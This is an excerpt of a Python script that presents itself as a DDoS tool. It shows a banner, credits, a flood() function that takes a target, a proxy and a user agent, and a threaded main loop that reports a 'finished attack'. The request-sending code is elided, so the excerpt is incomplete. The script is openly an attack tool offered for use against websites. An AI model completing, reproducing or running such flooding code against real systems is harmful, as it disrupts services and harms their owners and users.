...
| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$         | $$| $$  | $$| $$  | $$| $$    
| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$ /$$
|_______/ |_______/  \______/  \______/          |__/ \______/  \______/ |__/|__/
                                                                                 
                                                                                 
                                                                                """
    ,'DDOS TOOL TESTING!')
    print(colored("Created By: Mr Noobking ", 'green'))
    print(colored("PlXwFreeTeamHyberN\n\n", 'green'))
...
def flood(user_agent: str, proxy: str, target: str, thread: int):
    print(colored("MR NOOBKING: FLOOLDING THE WEBSITE LOL #{}".format(str(thread)), 'cyan'))
    headers = {
...
def main():
    ...
    for thread in range (1, threads):
        ...
        if thread % sleep == 0:
            time.sleep(10)
    t.join()
    print(colored("Finised Attack lol", 'green'))
